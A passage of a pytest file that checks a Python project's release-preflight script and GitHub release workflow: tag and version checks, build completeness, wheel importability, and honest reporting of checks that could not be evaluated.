"""Story 9.2 / AC5 — the release edge cases are an ENUMERATED SPACE with a live handler each.

Verification area ArgusAgent-RELEASE (``TC-ArgusAgent-RELEASE-001-NN``) — a NEW area; no
``RELEASE`` tests existed before this story, because before this story there was no
release path at all (measured: ``.github/workflows/`` held exactly ``audit-ci.yml`` and
``argus-student-audit.yml``, neither of which builds, tags or publishes; ``git tag -l``
was empty).

**Why this file is shaped the way it is (AI-E8-6).** The Epic-8 retrospective found that
all five of its stories shipped a guard NARROWER than its own acceptance criterion — a
sample where the AC said "every". AC5 says the enumeration must live in one named place
and that a committed test must assert *every member is handled* and *fail when a member is
added without a handler*. So:

* ``-01`` asserts the enumeration and the handler registry are the SAME SET. Adding
  ``E7`` to ``RELEASE_EDGE_CASE_IDS`` without writing ``check_e7_*`` fails here.
* ``-02`` asserts every member is assigned to a workflow PHASE, so a case cannot be
  handled in code yet never actually run.
* ``-03``..``-08`` give each member BOTH a refusing case and a non-refusing case. A check
  that returns a refusal unconditionally would pass a refusal-only test; a check that
  never refuses would pass a clearance-only test. Neither passes both.
* ``-09`` asserts the committed workflow really invokes the preflight for both phases —
  an enumeration nothing runs is documentation, not a guard.
* ``-10`` asserts the workflow makes no published-release claim and references no secret.

No network, no LLM, no ``.argus/`` write, no new dependency: the checks are pure functions
over an injected context, which is the reason the context is injected at all.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

_REPO_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(_REPO_ROOT / "scripts"))

import release_preflight as rp  # noqa: E402

_WORKFLOW = _REPO_ROOT / ".github" / "workflows" / "release.yml"


def _ctx(**overrides: object) -> rp.PreflightContext:
    """A context that clears EVERY check, so any single override isolates one case."""
    base = dict(
        repo_root=_REPO_ROOT,
        tag="v0.1.0",
        pyproject_version="0.1.0",
        dirty_paths=(),
        existing_tags=("v0.1.0",),
        head_sha="a" * 40,
        tag_sha="a" * 40,
        published_release_tags=(),
        dist_files=("argus_agent-0.1.0-py3-none-any.whl", "argus_agent-0.1.0.tar.gz"),
        creating_tag=False,
    )
    base.update(overrides)
    return rp.PreflightContext(**base)  # type: ignore[arg-type]


def test_TC_ArgusAgent_RELEASE_001_01_every_enumerated_case_has_a_handler() -> None:
    """TC-ArgusAgent-RELEASE-001-01 — AC5: the enumeration and the handler registry are one set."""
    enumerated = set(rp.RELEASE_EDGE_CASE_IDS)
    handled = {case for case in enumerated if rp.handler_for(case) is not None}
    described = set(rp.EDGE_CASE_DESCRIPTIONS)

    assert enumerated == {"E1", "E2", "E3", "E4", "E5", "E6"}, (
        "boundary B10 enumerates exactly six release edge cases"
    )
    assert enumerated == handled == described, (
        "every enumerated release edge case must have BOTH a handler and a description; "
        f"enumerated={sorted(enumerated)} handled={sorted(handled)} described={sorted(described)}"
    )
    # Fail-on-unenumerated, demonstrated rather than asserted: a member added to the
    # enumeration without a handler raises immediately.
    with pytest.raises(KeyError):
        rp.handler_for("E7")


def test_TC_ArgusAgent_RELEASE_001_02_every_case_is_assigned_to_a_phase() -> None:
    """TC-ArgusAgent-RELEASE-001-02 — AC5: a handled case that never runs is not handled.

    Every member must belong to exactly one workflow phase. Without this, a case could be
    implemented, registered, described — and never evaluated by any step of the release.
    """
    assigned = list(rp._PRE_BUILD) + list(rp._POST_BUILD)
    assert sorted(assigned) == sorted(rp.RELEASE_EDGE_CASE_IDS)
    assert len(assigned) == len(set(assigned)), "a case is assigned to two phases"
    # `--phase all` really runs all six.
    assert len(rp.run_preflight(_ctx(dirty_paths=("x",), dist_files=()), phase="all")) == 2


def test_TC_ArgusAgent_RELEASE_001_03_e1_refuses_a_dirty_tree_and_clears_a_clean_one() -> None:
    """TC-ArgusAgent-RELEASE-001-03 — AC5/E1: a dirty tree is refused; a clean one is not."""
    assert rp.check_e1_dirty_worktree(_ctx()) is None
    refusal = rp.check_e1_dirty_worktree(_ctx(dirty_paths=("argus/pipeline.py",)))
    assert refusal is not None and refusal.edge_case == "E1"
    assert "argus/pipeline.py" in refusal.reason


def test_TC_ArgusAgent_RELEASE_001_04_e2_refuses_recreating_an_existing_tag() -> None:
    """TC-ArgusAgent-RELEASE-001-04 — AC5/E2: creating an existing tag is refused, no overwrite.

    And, just as important, it does NOT fire on the tag-PUSH path: there the tag exists
    because that is why the run started, so a naive "the tag exists" check would refuse
    every legitimate release.
    """
    assert rp.check_e2_tag_already_exists(_ctx(creating_tag=False)) is None
    refusal = rp.check_e2_tag_already_exists(_ctx(creating_tag=True))
    assert refusal is not None and refusal.edge_case == "E2"
    assert rp.check_e2_tag_already_exists(
        _ctx(creating_tag=True, tag="v0.2.0", existing_tags=("v0.1.0",))
    ) is None


def test_TC_ArgusAgent_RELEASE_001_05_e3_refuses_a_moved_tag() -> None:
    """TC-ArgusAgent-RELEASE-001-05 — AC5/E3: a tag that no longer points at the build is refused."""
    assert rp.check_e3_tag_moved(_ctx()) is None
    refusal = rp.check_e3_tag_moved(_ctx(tag_sha="b" * 40))
    assert refusal is not None and refusal.edge_case == "E3"
    assert "b" * 12 in refusal.reason and "a" * 12 in refusal.reason


def test_TC_ArgusAgent_RELEASE_001_06_e4_refuses_overwriting_a_published_release() -> None:
    """TC-ArgusAgent-RELEASE-001-06 — AC5/E4: an already-published version is refused."""
    assert rp.check_e4_release_already_published(_ctx()) is None
    refusal = rp.check_e4_release_already_published(
        _ctx(published_release_tags=("v0.0.9", "v0.1.0"))
    )
    assert refusal is not None and refusal.edge_case == "E4"


def test_TC_ArgusAgent_RELEASE_001_07_e5_refuses_a_tag_version_mismatch() -> None:
    """TC-ArgusAgent-RELEASE-001-07 — AC5/E5: the tag and the packaged version must agree.

    Also covers the non-version tag, which is neither a match nor a mismatch and would
    otherwise fall through a naive equality check into a silent pass.
    """
    assert rp.check_e5_tag_version_mismatch(_ctx()) is None
    mismatch = rp.check_e5_tag_version_mismatch(_ctx(tag="v0.2.0"))
    assert mismatch is not None and mismatch.edge_case == "E5"
    assert "0.2.0" in mismatch.reason and "0.1.0" in mismatch.reason
    junk = rp.check_e5_tag_version_mismatch(_ctx(tag="release-candidate"))
    assert junk is not None and junk.edge_case == "E5"
    assert rp.normalize_tag("v1.2.3") == "1.2.3"
    assert rp.normalize_tag("1.2.3") is None


def test_TC_ArgusAgent_RELEASE_001_08_e6_refuses_a_partial_or_empty_build() -> None:
    """TC-ArgusAgent-RELEASE-001-08 — AC5/E6: both artifacts, or none. Never half a release."""
    assert rp.check_e6_incomplete_build(_ctx()) is None
    empty = rp.check_e6_incomplete_build(_ctx(dist_files=()))
    assert empty is not None and empty.edge_case == "E6"
    wheel_only = rp.check_e6_incomplete_build(
        _ctx(dist_files=("argus_agent-0.1.0-py3-none-any.whl",))
    )
    assert wheel_only is not None and wheel_only.edge_case == "E6"
    sdist_only = rp.check_e6_incomplete_build(_ctx(dist_files=("argus_agent-0.1.0.tar.gz",)))
    assert sdist_only is not None and sdist_only.edge_case == "E6"


def test_TC_ArgusAgent_RELEASE_001_09_the_workflow_actually_runs_the_preflight() -> None:
    """TC-ArgusAgent-RELEASE-001-09 — AC2/AC5: an enumeration nothing runs is documentation.

    The committed workflow must invoke BOTH phases, build both artifacts, declare its
    trigger and its permissions, and reference the preflight by its real path.
    """
    assert _WORKFLOW.is_file(), "the release workflow must be committed"
    text = _WORKFLOW.read_text(encoding="utf-8")
    assert "scripts/release_preflight.py" in text
    assert "--phase pre-build" in text and "--phase post-build" in text
    assert "python -m build" in text
    assert "permissions:" in text and "contents: write" in text
    assert "tags:" in text and "workflow_dispatch:" in text
    # The preflight script it names really exists at that path.
    assert (_REPO_ROOT / "scripts" / "release_preflight.py").is_file()


def test_TC_ArgusAgent_RELEASE_001_10_the_workflow_claims_no_publication_and_no_secret() -> None:
    """TC-ArgusAgent-RELEASE-001-10 — AC2/AC3/AC12: bounded claims, no undeclared credential.

    Two separate honesty properties of the release surface, pinned together because they
    fail together. (a) The workflow must not depend on a secret that AC3's access record
    does not name — it uses only the automatic ``github.token``, so ``secrets.`` must not
    appear at all. (b) It must not present the self-audit as assurance: no release surface
    may claim external validation or a cleared precision gate (SD-2).
    """
    text = _WORKFLOW.read_text(encoding="utf-8")
    assert "secrets." not in text, (
        "the release workflow references a repository secret; AC3 requires every "
        "credential a consumer or the workflow needs to be recorded, and D2 chose the "
        "GitHub-Release path precisely because it needs none"
    )
    lowered = text.lower()
    # (a2) And it carries no index-publishing STEP. D2 locked PyPI out of this story
    # because publishing a name+version is irreversible; the file may explain that in
    # prose, but it must not contain the action or the command that does it.
    for publisher in ("gh-action-pypi-publish", "twine upload", "flit publish"):
        assert publisher not in lowered, (
            f"the release workflow contains an index-publishing step ({publisher!r}); "
            "D2 locked PyPI out of this story as an irreversible operator decision"
        )
    for overclaim in (
        "externally validated",
        "independently validated",
        "externalization-grade",
        "gate cleared",
        "precision gate is cleared",
        "assurance evidence",
    ):
        assert overclaim not in lowered, f"the release workflow over-claims: {overclaim!r}"
    # And it states its own unproven status rather than implying a publication happened.
    assert "has never executed" in lowered


# ─────────────────────────────────────────────────────────────────────────────
# Story 9.2 / AC4 + AC5b — what the BUILT distribution can actually do.
#
# AC4 required the artifact to be PROVEN, not merely built, and the proof surfaced a
# defect no source-tree test could see. MEASURED on the built wheel
# (`argus_agent-0.1.0-py3-none-any.whl`, 76 entries = 71 `argus/**` modules + 5
# `dist-info`), with the wheel's contents on `sys.path`, this repository REMOVED from
# `sys.path`, and one clean subprocess per module (re-measured 2026-08-09):
#
#   66 of the 71 shipped modules import.
#   5 do NOT, all with `ModuleNotFoundError: No module named '_registry'`:
#     argus/precision/__init__.py, argus/precision/replay_harness.py,
#     argus/dogfood/proof_types.py, argus/dogfood/proof_render.py,
#     argus/dogfood/proof_run.py
#
# (An earlier revision of this block said "65 of the 69 ... 4 do NOT". 69 was the PRE-split
# module count and the four-module list silently dropped `replay_harness.py`, which is the
# module that causes the failure. Both were corrected against a fresh measurement rather
# than re-derived from the previous sentence.)
#
# The cause is one line: `argus/precision/replay_harness.py` unconditionally imports
# `_registry` from `tests/cartridges/`, a directory the distribution does not contain (and
# should not — it is the labelled ground-truth store for the precision harness). Every
# other failure is that one import, reached transitively.
#
# PRE-EXISTING, verified rather than assumed: the identical import exists at HEAD 7be90f7
# (`git show 7be90f7:argus/precision/replay_harness.py`), and `proof_run.py` imported
# `argus.precision.replay_harness` there too. The Story-9.2 split did not create it and
# did not widen the CONSUMER surface: the two new modules (`proof_types`, `proof_render`)
# fail only because they re-export what already failed, and `proof_run.py` failed before
# the split for the same reason. Nothing that imported before imports less now.
#
# NOT FIXED HERE, deliberately: `argus/precision/**` is FENCED by Story 9.2 / AC15, and
# the fix (a lazy or optional registry import) is a behavioural change to the precision
# substrate in a release story that has no mandate over it. Filed as `DF-9-2-A` in
# deferred-work.md with this measurement attached.
#
# ── FIXED 2026-08-12 by Story 11.5 (`DF-9-2-A` CLOSED), and the guard below was proven
#    VACUOUS in the doing. `argus/precision/replay_harness.py` now resolves the registry
#    through a lazy `_registry_module()` helper, and a freshly built wheel goes from
#    **67 of 72 import / 5 fail** to **72 of 72 import / 0 fail**. `-11` STAYED GREEN
#    ACROSS THE ENTIRE FIX: `import _registry` inside a function body is still an
#    `ast.Import` node named `_registry`, so a source-tree walk finds it exactly as
#    before. The walk cannot distinguish a module-level import from a lazy one — which is
#    the whole content of the fix — so it could never have held the claim README.md
#    credited it with ("pinned in both directions ... so this list cannot drift from the
#    code"). It also missed the record drifting underneath it: the denominator moved
#    71 → 72 and the importable count 66 → 67 across Epics 10–11 with nothing red, because
#    `-11` pins a SET OF PATHS and the documents publish NUMBERS.
#
#    `-11` is NARROWED rather than deleted (Story 11.5 / AC2.3): it still has one honest
#    job — naming which modules mention the repository-only test tree at all — and it says
#    so below. The claim about the BUILT DISTRIBUTION moved to
#    `TC-ArgusAgent-RELEASE-001-20` in `tests/test_built_distribution.py`, which builds a
#    real wheel and imports every shipped module out of it in a clean subprocess.
#
# WHY THE RELEASE STILL STANDS: IN-1/IN-3 need `argus audit` — the CLI, the pipeline, the
# detectors, the verdict gate, the reports. All of that imports and RUNS from the wheel
# (proven: `argus --help` exit 0; `argus audit <fixture>` -> RELEASE_READY, exit 0, from a
# working directory that is not this repository). What a consumer cannot do from the
# distribution alone is re-run Argus's own dogfood proof generator, which is a
# self-audit-of-Argus tool, not a consumer feature. README.md states this split.
#
# The guard below pins the boundary in BOTH directions.
# ─────────────────────────────────────────────────────────────────────────────

# Modules that are KNOWN to be unimportable from the built distribution. Pinned exactly:
# the guard fails if the set GROWS (a module joined the broken surface) and if it SHRINKS
# (the record went stale behind a fix). MEASURED EMPTY 2026-08-12 by Story 11.5 against a
# freshly built wheel — 72 of 72 shipped modules import with this repository off
# `sys.path`. It stays here, at the address Story 9.2 gave it, but it is ASSERTED by
# `TC-ArgusAgent-RELEASE-001-20` in `tests/test_built_distribution.py`, because that is
# the only guard in this suite that can actually observe it. It is imported from there
# rather than copied: a second copy of a pinned figure is the fork class Epic 9's
# retrospective named and this repository has now rotted twice.
_NOT_IMPORTABLE_FROM_DISTRIBUTION: frozenset[str] = frozenset()

# The import that does it, and the tree it points into.
_TEST_TREE_IMPORT = "_registry"

# Every `argus/**` module that NAMES the repository-only test tree, in any position —
# module level or inside a function body. This is what an `ast` walk can see, and it is
# ALL it can see. Post-fix these six still name `_registry` and all six import cleanly
# from the wheel; the two sets are unrelated, which is the point of separating them.
#
# `argus/precision/adjudication.py` joined the set on 2026-08-16 (Story 13.2) and the
# addition is DELIBERATE, which is what this registry exists to force someone to say. It
# names the repository-only tree ONLY in prose — its docstrings explain that the
# repository corpus lives at `tests/corpus/_manifest.py` — and it reaches that substrate
# exclusively through `replay_harness.corpus_manifest_module()`, the declared lazy edge
# (DF-9-2-A). It resolves NO repository path at module level, which is the property that
# actually decides whether a wheel can import, and which
# TC-ArgusAgent-RELEASE-001-20 measures on a real built artifact.
#
# `argus/precision/gate_decision.py` and `argus/precision/gate_disclosure.py` joined the
# set on 2026-08-17 (Story 13.3), and the addition is DELIBERATE on the same terms as
# 13.2's. Both reach the set TRANSITIVELY — neither writes `_registry` anywhere; they
# import `adjudication` / `replay_harness`, which already name it. Both resolve NO
# repository path at module level: `DECISION_RECORD_PATH` is a repository-relative
# forward-slash STRING the caller resolves against its own root (the same treatment
# `adjudication.RECORD_PATH` gets, for the same DF-9-2-A reason), and every corpus lookup
# goes through the declared lazy `corpus_manifest_module()` edge. The impure part — staging
# and auditing the cartridge corpus to measure protocol §5's clean-repo condition — lives
# in `scripts/build_gate_decision.py`, outside the shipped package, because a fold that
# stages repositories is the test shell (§3.3) and has no business in `argus/**`.
_MODULES_NAMING_THE_TEST_TREE_IMPORT: frozenset[str] = frozenset(
    {
        "argus/precision/__init__.py",
        "argus/precision/adjudication.py",
        "argus/precision/gate_decision.py",
        # ADDED 2026-08-20 (Story 16.1). §5's breadth condition. It names the repository-only
        # tree TRANSITIVELY, through gate_disclosure and replay_harness, exactly as its four
        # siblings above do — and it resolves NO path at module level (``DF-9-2-A``): the one
        # locked floor it derives from arrives as an ARGUMENT. The wheel-importability claim
        # is TC-ArgusAgent-RELEASE-001-20's, and it is asserted there, not here.
        "argus/precision/gate_breadth.py",
        # ADDED 2026-08-20 (Story 16.2). The two halves of ``DF-16-1-B``'s cohesion split of
        # ``gate_decision.py``: what a §5 condition IS, and what one is MEASURED FROM. Both
        # join the set TRANSITIVELY and for the same reason ``gate_decision.py`` itself is in
        # it — ``gate_conditions`` imports ``gate_breadth``, ``gate_evidence`` imports
        # ``gate_disclosure``, and both of those already name the repository-only tree in
        # prose. Neither resolves a path at module level (``DF-9-2-A``); neither performs any
        # I/O at all. This addition is DELIBERATE, which is what this registry exists to force
        # someone to say, and it is a consequence of a PURE MOVE: no symbol changed, no import
        # line anywhere in the repository moved, and the reach was already present in the
        # module these two were cut out of.
        "argus/precision/gate_conditions.py",
        "argus/precision/gate_evidence.py",
        # ADDED 2026-08-23 (Story 16.5). ``gate_independence`` derives WHO judged the
        # adjudication and whether they were independent of the tool's authors. It joins the
        # set TRANSITIVELY and by the narrowest possible edge: its ONLY import is
        # ``adjudication`` (for ``PROTOCOL_ADJUDICATOR_ROLES`` and ``adjudicator_role``),
        # which has named the repository-only tree in prose since 2026-08-16. The module
        # itself writes ``_registry`` nowhere, performs NO I/O of any kind, and resolves NO
        # path at module level (``DF-9-2-A``) — it cannot, because every input arrives as an
        # argument: ``assess_independence`` takes the already-derived ``adjudicators`` tuple
        # and nothing else. This addition is DELIBERATE, which is what this registry exists to
        # force someone to say, and the wheel-importability claim remains
        # TC-ArgusAgent-RELEASE-001-20's, asserted there over a real built artifact.
        "argus/precision/gate_independence.py",
        # ADDED 2026-08-23 (Story 16.7). ``silent_class`` derives the V2 SILENT test class -
        # spans that reach the SUT, discard the result and assert nothing at all - and
        # publishes it as a QUESTION for a named human. It joins the set TRANSITIVELY and by
        # the narrowest edge available: it imports ``adjudication`` (for the CLOSED
        # disposition vocabulary, ``LOCATOR_RE``, ``adjudicator_role`` and ``finding_row_id``,
        # borrowed rather than re-declared) and ``gate_independence`` (to CALL the existing
        # ``assess_independence``), and both have named the repository-only tree in prose
        # since 2026-08-16 and 2026-08-23 respectively. The module itself writes ``_registry``
        # nowhere, performs NO I/O of any kind, and resolves NO path at module level
        # (``DF-9-2-A``): ``SILENT_CLASS_RECORD_PATH`` and ``SILENT_CLASS_WORKLIST_PATH`` are
        # repository-relative forward-slash STRINGS the caller resolves against its own root,
        # the same treatment ``adjudication.RECORD_PATH`` gets, and every other input arrives
        # as an argument. All of its I/O lives in ``scripts/build_silent_class_record.py``,
        # outside the shipped package, because a builder that shells out to git over five
        # third-party repositories is the test shell (section 3.3). This addition is
        # DELIBERATE, which is what this registry exists to force someone to say, and the
        # wheel-importability claim remains TC-ArgusAgent-RELEASE-001-20's, asserted there
        # over a real built artifact. The edge into this module runs ONE WAY and that is
        # asserted separately by TC-ArgusAgent-PRECISION-001-127: nothing under
        # ``argus/detectors/**`` and no ``argus/precision/gate_*.py`` may import it, because
        # a predicate that scores test functions sitting on the detector path is a shipped
        # promotion waiting for someone to wire it up.
        "argus/precision/silent_class.py",
        # ADDED 2026-08-20 (Story 16.2). §5's SEAL condition and the partition rule. It joins
        # TRANSITIVELY through gate_breadth / gate_disclosure, resolves NO path at module level
        # and performs no I/O at all — asserted STRUCTURALLY by an AST walk of its own imports
        # in tests/test_gate_seal.py::TC-ArgusAgent-PRECISION-001-87. DETECTOR_TUNING_PATHS is
        # a tuple of repository-relative STRINGS the caller resolves, the same treatment
        # gate_decision.DECISION_RECORD_PATH gets and for the same DF-9-2-A reason.
        "argus/precision/gate_seal.py",
        # ADDED 2026-08-20 (Story 16.3). §5's SEVENTH condition — the YIELD floor. It joins
        # TRANSITIVELY through gate_disclosure / replay_harness, exactly as its siblings do,
        # and it resolves NO path at module level (``DF-9-2-A``): the threshold it derives
        # the floor from arrives as an ARGUMENT, and the module performs no I/O at all. That
        # is asserted STRUCTURALLY, by an AST walk of the module's own imports and names, in
        # tests/test_gate_yield.py::TC-ArgusAgent-PRECISION-001-99 — a walk that additionally
        # forbids any recall / FN / bench-content reference, because a floor derived from
        # those would be a recall gate and re-opening the OI1 lock is an operator act. The
        # dated figures it publishes (the 2026-08-18 set's 4284/0 and the 2026-08-16 set's
        # 31) are STRINGS the module cannot read for itself; they are re-derived from the
        # committed artifacts by TC-ArgusAgent-PRECISION-001-100. This addition is
        # DELIBERATE, which is what this registry exists to force someone to say.
        "argus/precision/gate_yield.py",
        "argus/precision/gate_disclosure.py",
        "argus/precision/replay_harness.py",
        "argus/dogfood/proof_types.py",
        "argus/dogfood/proof_render.py",
        "argus/dogfood/proof_run.py",
    }
)

# The consumer-facing surface IN-1 / IN-3 depend on. Every one of these was executed from
# the installed wheel during Story 9.2's AC4 proof.
_CONSUMER_SURFACE = (
    "argus/__init__.py",
    "argus/cli.py",
    "argus/pipeline.py",
    "argus/models.py",
    "argus/verdict/verdict_gate.py",
    "argus/reports/generator.py",
)


def _modules_reaching(target: str) -> set[str]:
    """Every ``argus/**`` module that imports *target*, directly or transitively."""
    import ast

    package_root = _REPO_ROOT / "argus"
    edges: dict[str, set[str]] = {}
    direct: set[str] = set()
    for path in sorted(package_root.rglob("*.py")):
        if "__pycache__" in path.parts:
            continue
        rel = path.relative_to(_REPO_ROOT).as_posix()
        edges[rel] = set()
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            names: list[str] = []
            if isinstance(node, ast.Import):
                names = [a.name for a in node.names]
            elif isinstance(node, ast.ImportFrom) and node.module:
                names = [node.module]
            for name in names:
                if name == target:
                    direct.add(rel)
                elif name.startswith("argus."):
                    parts = name.split(".")
                    module_path = "/".join(parts) + ".py"
                    package_path = "/".join(parts) + "/__init__.py"
                    edges[rel].add(module_path)
                    edges[rel].add(package_path)
    reaching = set(direct)
    changed = True
    while changed:
        changed = False
        for source, targets in edges.items():
            if source in reaching:
                continue
            if targets & reaching:
                reaching.add(source)
                changed = True
    return reaching


def test_TC_ArgusAgent_RELEASE_001_11_source_graph_names_the_test_tree_reach() -> None:
    """TC-ArgusAgent-RELEASE-001-11 — NARROWED 2026-08-12 (Story 11.5 / AC2.3).

    **What this guard can see:** which ``argus/**`` modules NAME ``tests/cartridges``'s
    ``_registry``, directly or transitively, anywhere in their source.

    **What it CANNOT see, and was wrongly credited with:** whether the built distribution
    is importable. It walks the SOURCE TREE with ``ast``, and an ``ast.Import`` node named
    ``_registry`` looks identical whether it sits at module level (which breaks every
    consumer of the wheel) or inside a function body (which breaks nobody). Story 11.5
    moved that import into ``_registry_module()``, the wheel went from 5 failing modules
    to 0 — and this test did not move. It also cannot see the NUMBERS the documents
    publish: it pins a set of paths, so "66 of the 71" stayed in README.md and CHANGELOG.md
    for two epics while the truth became 67 of 72.

    **The claim about the distribution now lives in
    ``tests/test_built_distribution.py::test_TC_ArgusAgent_RELEASE_001_20_…``**, which
    builds a real wheel and imports every shipped module out of it in a clean subprocess
    with this repository off ``sys.path``. This one is kept, narrowed, because knowing
    which modules touch the repository-only tree is still worth pinning — ``-12`` reads
    the same walk to keep that reach off the consumer surface.
    """
    reaching = _modules_reaching(_TEST_TREE_IMPORT)
    assert reaching, "the import-graph walk found nothing — the walk itself is broken"
    assert reaching == set(_MODULES_NAMING_THE_TEST_TREE_IMPORT), (
        "the set of argus/** modules NAMING the repository-only test tree changed. This "
        "says nothing on its own about what the wheel can import (see the docstring and "
        f"TC-ArgusAgent-RELEASE-001-20) — but it is a deliberate decision either way. "
        f"expected {sorted(_MODULES_NAMING_THE_TEST_TREE_IMPORT)}, "
        f"measured {sorted(reaching)}"
    )


def test_TC_ArgusAgent_RELEASE_001_12_consumer_surface_is_shippable() -> None:
    """TC-ArgusAgent-RELEASE-001-12 — AC4/IN-1/IN-3: the surface consumers need is clean.

    This is the half that must never regress. ``argus audit`` is the entire integration
    contract for the downstream repository (IN-1 dependency, IN-3 CI gate). If any module
    on that path ever starts reaching into ``tests/``, the wheel stops being installable
    for its actual purpose — and this fails before the release, not after.
    """
    reaching = _modules_reaching(_TEST_TREE_IMPORT)
    broken = [module for module in _CONSUMER_SURFACE if module in reaching]
    assert not broken, (
        f"the consumer-facing surface reaches the test tree and cannot ship: {broken}"
    )
    for module in _CONSUMER_SURFACE:
        assert (_REPO_ROOT / module).is_file(), f"{module} is not on disk"


# ─────────────────────────────────────────────────────────────────────────────
# Story 9.2 / code-review iteration 1 — a guard that cannot observe is not a guard,
# and untrusted input must never reach shell source.
#
# Three defects were found in the shipped release surface and are pinned here so they
# cannot come back:
#
#  * E4 could never fire in CI (the preflight step had no GH_TOKEN, `gh release list`
#    failed on authentication, and the failure was swallowed into "no releases known"),
#    while the report printed `ok` for it into the workflow log — a PUBLICATION surface
#    asserting a clearance it was structurally unable to evaluate. `-13`..`-16`.
#  * `workflow_dispatch.inputs.tag` was interpolated into `run:` script bodies on a job
#    holding `contents: write`, which is GitHub's documented script-injection
#    anti-pattern. `-17`.
#  * E2 was registered, handled and phase-assigned but unreachable from the committed
#    workflow, so the enumeration read as more active than it is. `-18`.
# ─────────────────────────────────────────────────────────────────────────────


def _run_block_bodies(text: str) -> list[str]:
    """Every ``run:`` script body in a workflow, as the shell would receive it.

    Deliberately textual and dependency-free (this file must not add a YAML dependency to
    the suite): a ``run:`` value is either inline or a block scalar whose body is the
    following more-indented lines.
    """
    lines = text.splitlines()
    bodies: list[str] = []
    index = 0
    while index < len(lines):
        line = lines[index]
        stripped = line.strip()
        if not stripped.startswith("run:"):
            index += 1
            continue
        indent = len(line) - len(line.lstrip())
        rest = stripped[len("run:"):].strip()
        index += 1
        if rest and rest not in ("|", ">", "|-", ">-", "|+", ">+"):
            bodies.append(rest)
            continue
        body: list[str] = []
        while index < len(lines):
            candidate = lines[index]
            if candidate.strip() and (len(candidate) - len(candidate.lstrip())) <= indent:
                break
            body.append(candidate)
            index += 1
        bodies.append("\n".join(body))
    return bodies


def test_TC_ArgusAgent_RELEASE_001_13_e4_separates_no_releases_from_could_not_ask() -> None:
    """TC-ArgusAgent-RELEASE-001-13 — AC5/E4: "could not ask" is not "asked, none exist".

    The pre-fix shape collapsed both into an empty tuple, so an unauthenticated runner
    produced an E4 clearance byte-identical to a real one. The distinction now lives in the
    type: ``None`` means the question could not be put, and the answer is
    :class:`Unevaluable` — which is neither a refusal nor a clearance.
    """
    assert rp.check_e4_release_already_published(_ctx(published_release_tags=())) is None

    unknown = rp.check_e4_release_already_published(_ctx(published_release_tags=None))
    assert isinstance(unknown, rp.Unevaluable), (
        "E4 cleared a run in which it could not observe the published-release list"
    )
    assert unknown.edge_case == "E4"
    assert "could not be obtained" in unknown.reason

    # An unevaluated case is NOT reported as a refusal: the release is not blocked by the
    # absence of `gh`, it is merely not cleared on that point.
    refusals = rp.run_preflight(_ctx(published_release_tags=None), phase="pre-build")
    assert refusals == [], "an unevaluable check must not masquerade as a refusal"

    # ...and it is still visible in the full-fidelity result.
    outcomes = dict(rp.run_checks(_ctx(published_release_tags=None), phase="pre-build"))
    assert isinstance(outcomes["E4"], rp.Unevaluable)
    assert outcomes["E1"] is None and outcomes["E5"] is None


def test_TC_ArgusAgent_RELEASE_001_14_the_report_never_prints_ok_for_an_unevaluated_case(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """TC-ArgusAgent-RELEASE-001-14 — AC2/AC5: the printed report is a publication surface.

    The workflow log is read by humans and is where the false clearance actually appeared.
    This drives ``main()`` end-to-end over a context whose release list could not be
    obtained and asserts the line for E4 says ``UNKNOWN``, that the run does not claim
    everything was cleared, and that it says in words that this is not a clearance.
    """
    monkeypatch.setattr(
        rp, "gather_context", lambda *a, **k: _ctx(published_release_tags=None)
    )
    exit_code = rp.main(["--tag", "v0.1.0", "--phase", "pre-build"])
    out = capsys.readouterr().out
    e4_line = next(line for line in out.splitlines() if line.strip().startswith("E4 "))

    assert "UNKNOWN" in e4_line, f"E4 was reported as something other than UNKNOWN: {e4_line!r}"
    assert not e4_line.rstrip().endswith("ok"), (
        "the report printed `ok` for a check that could not observe what it needs"
    )
    assert "all enumerated release edge cases cleared" not in out, (
        "the run claimed a full clearance while E4 was never evaluated"
    )
    assert "not a clearance" in out
    assert exit_code == 0, (
        "an unevaluable E4 must not block the release: `gh` is legitimately absent "
        "locally and `gh release create --verify-tag` still refuses to clobber"
    )

    # Control: when the list IS obtainable and empty, E4 clears and says so.
    monkeypatch.setattr(rp, "gather_context", lambda *a, **k: _ctx(published_release_tags=()))
    assert rp.main(["--tag", "v0.1.0", "--phase", "pre-build"]) == 0
    cleared = capsys.readouterr().out
    assert "all enumerated release edge cases cleared" in cleared
    assert "UNKNOWN" not in cleared


def test_TC_ArgusAgent_RELEASE_001_15_the_release_list_collector_reports_could_not_ask(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """TC-ArgusAgent-RELEASE-001-15 — AC5/E4: the collector itself distinguishes the two.

    ``-13`` pins the check; this pins the impure half that feeds it, because the swallow
    happened there. All three failure modes — ``gh`` absent, ``gh`` exiting non-zero
    (which is what an unauthenticated runner does), and unparseable output — must report
    "could not ask", while a genuine empty list must report "asked, none".
    """
    import subprocess as _subprocess

    class _Proc:
        def __init__(self, returncode: int, stdout: str) -> None:
            self.returncode = returncode
            self.stdout = stdout

    def _absent(*_a: object, **_k: object) -> object:
        raise FileNotFoundError("gh")

    monkeypatch.setattr(_subprocess, "run", _absent)
    assert rp._published_release_tags(_REPO_ROOT) is None, "missing `gh` reported as 'none'"

    monkeypatch.setattr(_subprocess, "run", lambda *a, **k: _Proc(1, ""))
    assert rp._published_release_tags(_REPO_ROOT) is None, (
        "an unauthenticated `gh release list` was reported as 'no releases exist'"
    )

    monkeypatch.setattr(_subprocess, "run", lambda *a, **k: _Proc(0, "not json"))
    assert rp._published_release_tags(_REPO_ROOT) is None

    monkeypatch.setattr(_subprocess, "run", lambda *a, **k: _Proc(0, "[]"))
    assert rp._published_release_tags(_REPO_ROOT) == (), (
        "a genuine empty release list must be 'asked, none exist', not 'could not ask'"
    )

    monkeypatch.setattr(
        _subprocess, "run", lambda *a, **k: _Proc(0, '[{"tagName": "v0.0.9"}]')
    )
    assert rp._published_release_tags(_REPO_ROOT) == ("v0.0.9",)


def test_TC_ArgusAgent_RELEASE_001_16_the_workflow_gives_e4_what_it_needs_to_observe() -> None:
    """TC-ArgusAgent-RELEASE-001-16 — AC5: the pre-build preflight step can actually reach the API.

    The defect was structural, not logical: the step that runs E1-E5 had no ``GH_TOKEN``,
    only the final publish step did, so E4 could never fire no matter how correct the
    check was. This asserts the token reaches the step that needs it, and that it is the
